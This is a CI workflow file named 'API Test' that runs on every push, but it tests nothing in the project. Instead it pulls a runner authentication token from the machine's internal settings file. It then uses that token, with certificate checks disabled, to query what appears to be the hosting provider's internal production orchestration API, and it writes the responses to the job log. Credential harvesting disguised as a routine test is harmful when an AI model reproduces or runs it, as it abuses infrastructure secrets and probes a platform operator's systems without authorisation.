name: API Test
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Final API test
        run: |
          TOK=$(python3 -c "import json;t=json.load(open('/opt/hca/.settings'))['authToken'];print(t)")
          API="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/"
          
          echo "=== /v1/ with fresh token ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --connect-timeout 5 \
              -H "Authorization: Bearer $TOK" "$API" 2>&1
          
          echo ""
          echo "=== Twirp GetPlanStatus ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --http2 --connect-timeout 5 \
              -H "Authorization: Bearer $TOK" \
              -H "Content-Type: application/json" \
              -d '{}' \
              "${API}twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
          
          echo ""
          echo "=== Root health ==="
          curl -sk --connect-timeout 5 "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/" 2>&1
